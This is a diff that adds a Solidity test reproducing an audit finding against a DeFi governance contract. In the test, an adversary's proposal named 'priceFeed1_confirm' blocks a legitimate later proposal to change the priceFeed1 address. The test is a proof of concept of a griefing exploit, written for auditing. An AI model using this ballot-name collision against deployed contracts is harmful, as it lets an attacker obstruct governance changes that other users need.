@@ -1732,6 +1732,35 @@ staking.stakeSALT(1000 ether);
         // Assert that the ballot is for the correct token
         assertEq(ballot.address1, address(testToken));
     }
+
+
+// From: https://github.com/code-423n4/2024-01-salty-findings/issues/620
+function testProposeSetContractAddress_confirm() public {
+    uint256 initialNextBallotId = proposals.nextBallotID();
+
+    // Alice is the adversary
+    vm.startPrank(alice);
+    staking.stakeSALT(1000 ether);
+
+    // Create a poisonous proposal with a ballot name ending in `_confirm`
+    address newAddress = address(0x1111111111111111111111111111111111111112);
+    proposals.proposeSetContractAddress("priceFeed1_confirm", newAddress, "description");
+    assertEq(proposals.nextBallotID(), initialNextBallotId + 1); // proposal was created successfully
+    vm.stopPrank();
+
+    // Transfer some tokens to Bob who wants to create a legit proposal
+    vm.startPrank(DEPLOYER);
+    salt.transfer(bob, 1000 ether);
+    vm.stopPrank();
+
+    // Bob can't create a legit proposal to change the contract address of `priceFeed1`
+    vm.startPrank(bob);
+    staking.stakeSALT(1000 ether);
+
+
+   // vm.expectRevert("Cannot create a proposal for a ballot with a secondary confirmation");
+    proposals.proposeSetContractAddress("priceFeed1", newAddress, "description");
+}
    }
 
 
